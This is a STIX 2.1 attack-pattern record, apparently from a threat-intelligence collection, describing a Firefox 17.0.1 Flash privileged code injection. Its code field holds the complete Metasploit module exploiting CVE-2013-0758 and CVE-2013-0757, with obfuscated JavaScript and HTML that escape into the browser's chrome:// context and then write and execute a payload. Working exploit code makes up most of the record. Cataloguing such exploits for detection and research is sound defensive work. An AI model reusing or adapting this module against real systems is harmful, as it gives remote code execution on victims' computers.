{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--16397344-8a12-43f6-ab1f-477c2628e725",
    "created": "2024-08-14T17:05:41.485464Z",
    "modified": "2024-08-14T17:05:41.485468Z",
    "name": "Firefox 17.0.1 Flash Privileged Code Injection",
    "description": " This exploit gains remote code execution on Firefox 17 and 17.0.1, provided the user has installed Flash. No memory corruption is used.  First, a Flash object is cloned into the anonymous content of the SVG",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_svg_plugin.rb",
            "external_id": "firefox_svg_plugin.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/2013/mfsa2013-15.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=813906"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::EXE\n  # include Msf::Exploit::Remote::BrowserAutopwn\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  # autopwn_info({\n  #   :ua_name    => HttpClients::FF,\n  #   :ua_minver  => \"17.0\",\n  #   :ua_maxver  => \"17.0.1\",\n  #   :javascript => true,\n  #   :rank       => NormalRanking\n  # })\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox 17.0.1 Flash Privileged Code Injection',\n      'Description'    => %q{\n        This exploit gains remote code execution on Firefox 17 and 17.0.1, provided\n        the user has installed Flash. No memory corruption is used.\n\n        First, a Flash object is cloned into the anonymous content of the SVG\n        \"use\" element in the <body> (CVE-2013-0758). From there, the Flash object\n        can navigate a child frame to a URL in the chrome:// scheme.\n\n        Then a separate exploit (CVE-2013-0757) is used to bypass the security wrapper\n        around the child frame's window reference and inject code into the chrome://\n        context. Once we have injection into the chrome execution context, we can write\n        the payload to disk, chmod it (if posix), and then execute.\n\n        Note: Flash is used here to trigger the exploit but any Firefox plugin\n        with script access should be able to trigger it.\n      },\n      'License'        => MSF_LICENSE,\n      'Targets' => [\n        [\n          'Universal (Javascript XPCOM Shell)', {\n            'Platform' => 'firefox',\n            'Arch' => ARCH_FIREFOX\n          }\n        ],\n        [\n          'Native Payload', {\n            'Platform' => %w{ java linux osx solaris win },\n            'Arch'     => ARCH_ALL\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'Author'         =>\n        [\n          'Marius Mlynski', # discovery & bug report\n          'joev',           # metasploit module\n          'sinn3r'          # metasploit fu\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-0758'],  # navigate a frame to a chrome:// URL\n          ['CVE', '2013-0757'],  # bypass Chrome Object Wrapper to talk to chrome://\n          ['OSVDB', '89019'],  # maps to CVE 2013-0757\n          ['OSVDB', '89020'],  # maps to CVE 2013-0758\n          ['URL', 'http://www.mozilla.org/security/announce/2013/mfsa2013-15.html'],\n          ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=813906']\n        ],\n      'DisclosureDate' => '2013-01-08',\n      'BrowserRequirements' => {\n        :source  => 'script',\n        :ua_name => HttpClients::FF,\n        :ua_ver  => /17\\..*/,\n        :flash   => /[\\d.]+/\n      }\n    ))\n\n    register_options(\n      [\n        OptString.new('CONTENT', [ false, \"Content to display inside the HTML <body>.\", '' ] ),\n        OptBool.new('DEBUG_JS', [false, \"Display some alert()'s for debugging the payload.\", false])\n      ], Auxiliary::Timed)\n\n  end\n\n  def on_request_exploit(cli, request, info)\n    if request.uri =~ /\\.swf$/\n      # send Flash .swf for navigating the frame to chrome://\n      print_status(\"Sending .swf trigger.\")\n      send_response(cli, flash_trigger, { 'Content-Type' => 'application/x-shockwave-flash' })\n    else\n      # send initial HTML page\n      print_status(\"Target selected: #{target.name}\")\n      print_status(\"Sending #{self.name}\")\n      send_response_html(cli, generate_html(cli, target))\n    end\n  end\n\n  # @return [String] the contents of the .swf file used to trigger the exploit\n  def flash_trigger\n    swf_path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-0758.swf\")\n    @flash_trigger ||= File.read(swf_path)\n  end\n\n  # @return [String] containing javascript that will alert a debug string\n  #   if the DEBUG is set to true\n  def js_debug(str, quote=\"'\")\n    if datastore['DEBUG_JS'] then \"alert(#{quote}#{str}#{quote})\" else '' end\n  end\n\n  # @return [String] HTML that is sent in the first response to the client\n  def generate_html(cli, target)\n    vars = {\n      :symbol_id        => 'a',\n      :random_domain    => 'safe',\n      :payload          => run_payload, # defined in FirefoxPrivilegeEscalation mixin\n      :payload_var      => 'c',\n      :payload_key      => 'k',\n      :payload_obj_var  => 'payload_obj',\n      :interval_var     => 'itvl',\n      :access_string    => 'access',\n      :frame_ref        => 'frames[0]',\n      :frame_name       => 'n',\n      :loader_path      => \"#{get_module_uri}.swf\",\n      :content          => self.datastore['CONTENT'] || ''\n    }\n    script = js_obfuscate %Q|\n      var #{vars[:payload_obj_var]} = #{JSON.unparse({vars[:payload_key] => vars[:payload]})};\n      var #{vars[:payload_var]} = #{vars[:payload_obj_var]}['#{vars[:payload_key]}'];\n      function $() {\n        document.querySelector('base').href = \"http://www.#{vars[:random_domain]}.com/\";\n      }\n      function _() {\n        return '#{vars[:frame_name]}';\n      }\n      var #{vars[:interval_var]} = setInterval(function(){\n        try{ #{vars[:frame_ref]}['#{vars[:access_string]}'] }\n        catch(e){\n          clearInterval(#{vars[:interval_var]});\n          var p = Object.getPrototypeOf(#{vars[:frame_ref]});\n          var o = {__exposedProps__: {setTimeout: \"rw\", call: \"rw\"}};\n          Object.prototype.__lookupSetter__(\"__proto__\").call(p, o);\n          p.setTimeout.call(#{vars[:frame_ref]}, #{vars[:payload_var]}, 1);\n        }\n      }, 100);\n      document.querySelector('object').data = \"#{vars[:loader_path]}\";\n      document.querySelector('use').setAttributeNS(\n        \"http://www.w3.org/1999/xlink\", \"href\", location.href + \"##{vars[:symbol_id]}\"\n      );\n    |\n\n    %Q|\n      <!doctype html>\n      <html>\n      <head>\n        <base href=\"chrome://browser/content/\">\n      </head>\n      <body>\n\n      <svg style='position: absolute;top:-500px;left:-500px;width:1px;height:1px'>\n        <symbol id=\"#{vars[:symbol_id]}\">\n          <foreignObject>\n            <object></object>\n          </foreignObject>\n        </symbol>\n        <use />\n      </svg>\n\n      <script>\n      #{script}\n      </script>\n\n      <iframe style=\"position:absolute;top:-500px;left:-500px;width:1px;height:1px\"\n        name=\"#{vars[:frame_name]}\"></iframe>\n      #{vars[:content]}\n      </body>\n      </html>\n      |\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-01-08",
    "x_mitre_platforms": [
        "%w{ java linux osx solaris win }"
    ]
}